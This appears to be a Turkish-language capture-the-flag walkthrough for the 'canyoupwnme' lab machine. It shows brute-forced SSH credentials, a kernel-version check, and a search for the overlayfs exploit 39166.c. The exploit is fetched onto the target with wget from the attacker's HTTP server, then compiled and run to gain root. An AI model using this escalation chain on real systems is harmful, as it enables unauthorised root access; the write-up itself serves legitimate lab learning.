@@ -1,0 +1,39 @@
+şimdi sisteme admin:admin veya user:resu bilgilerle giriş yapıyoruz bunu ssh brute force ataktan sonra öğrenmiştik giriş yaptıktan sonra ;
+
+cat /etc/issue  yazıyoruz 
+
+user@canyoupwnme:~$ cat /etc/issue
+Ubuntu 14.04.3 LTS \n \l
+
+
+çekirdek sürümünü öğrendik ubuntu 14.04.3 şimdi exploit-db üzerinden ve tarayıcıdan bu sürümde yetki yükseltme zaafiyetlerini araştırıyoruz ;
+
+2016-05-04				Linux Kernel (Ubuntu 14.04.3) - 'perf_event_open()' Can Race with execve() (Access /etc/shadow)	Local	Linux	Google Security Research
+
+exploit-db üzerinden bri zaafiyet buldum şimdi searchsploit üzerinden birdaha aratacam bunun için searchsploit ubuntu 14.04 diye aratma yapıyorum 
+
+Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation (1)                 | 39166.c                                                                                                      | linux/local/39166.c
+
+
+bu modül bize uygun olduğunu düşünerek ; 
+
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# cp /usr/share/exploitdb//exploits/linux/local/39166..c .
+
+bu komut bulunduğunuz yere dosyayı kopyalar şimdi python -m http.server x.port diye yazıp bir http server ayağa kaldırıyorum 
+
+sonra sunucuya gidip şu komutları çalıştırıyorum 
+
+ wget <ip_adresini>:x.port/39166.c 
+
+yazarak c dosyasını çekiyorum çektikten sonra gcc 39166.c komutunu yazıyorum bu komut bu dosyayı derliyor
+
+sonrasında ./a.out veya ./-o ile verdiğiniz isim 
+
+derledikten sonra direk sistemde root oluyorum 
+
+
+user@canyoupwnme:/tmp$ ./cır
+root@canyoupwnme:/tmp# 
+
+
